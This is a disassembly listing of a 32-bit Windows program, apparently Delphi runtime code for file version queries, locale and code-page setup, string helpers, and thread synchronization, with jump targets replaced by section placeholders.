call sub_403fe8
lea eax [ ebp - 0x8 ]
call j_sub_40441c#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404410
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bfd5
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
mov eax ebx
call sub_4026dc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40bfb1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404410
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026fc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40bfe4
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c05c
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_404410
mov edx esi
dec edx
call sub_40bfe4
sub_40c098
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404210
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c0c0
pop esi
pop ebx
retn
mov eax ebx
call sub_404210
mov esi eax
sub_40c0c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404210
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c2d0
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c118
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_404210
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c2d0
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c2d0
dec eax
mov ebx eax
sub_40c1a8
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404210
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c118
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_404210
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c20c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404210
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_404210
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c118
mov eax esi
call sub_404210
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_404210
mov [ esp ] eax
jmp r-xdata
sub_40c294
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_404410
add eax esi
dec eax
call sub_40c26c
sub_40c2d0
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_404410
add eax ebx
dec eax
call sub_40c26c
add eax ebx
sub_40c30c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_404210
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c05c
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c340
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_403fa4
mov eax [ ebx ]
call sub_404210
mov edx eax
mov eax [ ebx ]
call sub_40c30c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_404218
sub_40c380
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_404410
push eax
mov eax esi
call sub_404410
mov ebp eax
mov eax ebp
pop edx
call sub_40c3b8
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c3b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408718
mov [ esp ] eax
mov eax ebp
call sub_408718
mov edi eax
mov edx ebp
mov eax esi
call sub_4088b0
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c080
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_4088b0
mov ebx eax
inc ebx
sub_40c458
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c480
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c480
test eax eax
jne r-xdata
sub_40c480
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_40889c
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c080
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_40889c
mov edi eax
test edi edi
jne r-xdata
sub_40c4c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c524
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_4041c0
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_4081f8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c52b
lea eax [ ebp - 0xc ]
call sub_403f50
retn
sub_40c534
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c4c0
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c5ac
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c594
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c534
pop ecx
push ebp
call sub_40c534
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402c80
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c720
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40c9eb
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c5ac
call sub_40af9c
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40aeec
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403fa4
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40aeec
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_4081f8
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40aeec
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_4081f8
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40af38
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40af38
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40aeec
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_4081f8
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40af38
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40aeec
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b224
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403fa4
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40aeec
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b224
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403fa4
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40af38
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40aeec
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403fa4
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40aeec
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403fa4
lea eax [ ebp - 0x8 ]
call sub_403f50
lea eax [ ebp - 0xc ]
call sub_403f50
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40aeec
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_4081f8
test eax eax
jne r-xdata
call sub_40b174
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fe8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fe8
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4042d0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4042d0
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40af38
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c9f2
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403f74
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40aeec
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_4081f8
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40aeec
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_4081f8
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_403fe8
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_403fe8
jmp r-xdata
sub_40ca98
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40cbbb
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403fe8
lea eax [ ebp - 0xc ]
mov edx edi
call sub_403fe8
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_407e70
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407e70
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_403fe8
mov eax esi
call sub_403f50
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40c380
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cbc2
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403f74
retn
push [ esi ]
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404470
push [ ebp - 0x14 ]
push [ ebp - 0x4 ]
mov eax esi
mov edx 0x3
call sub_4042d0
lea eax [ ebp - 0x10 ]
push eax
mov eax edi
call sub_404210
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x10 ]
call sub_404470
test [ ebp + 0xc ] 0x1
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404218
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404210
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x8 ]
call sub_404470
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404218
jmp r-xdata
sub_40cbd4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40cc64
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40aea0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cc6b
lea eax [ ebp - 0x14 ]
call sub_403f50
retn
sub_40ccbc
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_4086a4
mov [ rw-data ] eax
sub_40cd40
push ebx
push esi
push edi
push ebp
call sub_403508
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026fc
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403144
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034f0
sub_40cda8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40cd90
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40ce30
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407cac
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40cd30
mov [ ebp ] eax
sub_40ce30
push ebx
mov ebx eax
mov eax ebx
call sub_40cd90
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40cd30
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40ce70
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_40cee4
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
call sub_40cf70
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403154
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_40cf70
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cf2c
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40cda8
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40cd38
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40cd18
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40cd38
test eax eax
je r-xdata
mov eax edi
call sub_40cf2c
test bl bl
je r-xdata
mov eax edi
call sub_40cf60
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40cd18
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40cd24
sub_40d00c
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cda8
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40cd38
mov eax ebx
call sub_40cf44
mov eax ebx
call sub_40cf38
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ce20
sub_40d05c
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40cda8
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40cf50
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40cd24
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40cd18
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40cf50
mov eax esi
call sub_40cf44
sub_40d0c8
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cda8
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ce20
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40cd18
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40cf44
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40cf44
sub_40d140
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d164
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d1db
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4057bc
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_403208
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d1e2
lea eax [ ebp - 0x4 ]
call sub_4057bc
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_403208
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d140
test al al
jne r-xdata
mov al 0x1
sub_40d1fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d26e
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d250
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404410
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d257
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d280
sbb eax 0x4000000
add ecx [ eax ]
dec eax
jg r-xdata
add [ edx + eax + 0x7d880048 ] dh
dec eax
add [ edx + eax + 0x7d940048 ] ch
dec eax
add [ edx + eax - 0x7f8bffb8 ] ah
dec eax
add [ edx + eax + 0x7d900048 ] bl
dec eax
add [ edx + eax - 0x7edbffb8 ] dl
dec eax
add [ edx + eax + 0x7f080048 ] cl
dec eax
add [ edx + eax + 0x7edc0048 ] al
dec eax
add [ edx + eax + 0x48 ] bh
add [ eax ] bh
or [ eax ] rw-data
int3
add ah bh
add cl [ eax ]
hlt
sub_40d6d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d738
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d73f
retn
mov eax sub_40d280
call sub_403c78
mov eax r-xdata
call sub_403ca0
cmp [ rw-data ] 0x0
je r-xdata
call sub_40bd64
call sub_40be68
call sub_40ccbc
call sub_40c720
mov eax rw-data
mov edx r-xdata
call sub_403fa4
sub_40d770
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d7c4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d81e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041d8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_408210
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d825
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_40d830
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d88a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041d8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4095c8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
